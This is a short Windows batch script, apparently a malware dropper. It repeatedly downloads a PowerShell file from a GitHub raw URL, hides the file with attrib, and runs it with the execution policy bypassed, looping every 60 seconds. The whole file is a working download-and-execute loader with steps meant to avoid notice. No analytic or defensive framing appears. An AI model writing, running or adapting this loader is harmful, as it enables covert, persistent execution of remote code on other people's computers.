@echo off
:download_and_execute
set payloadUrl=https://raw.githubusercontent.com/dyaa1997dyaa/tmp/main/tmpxvrt.ps1
set output="C:\Users\admin\Desktop\EDU\tmpxvrt.ps1"


powershell.exe -Command "Invoke-WebRequest -Uri '%payloadUrl%' -OutFile '%output%'"


attrib +h %output%


powershell.exe -ExecutionPolicy Bypass -File %output%


timeout /t 60


goto download_and_execute
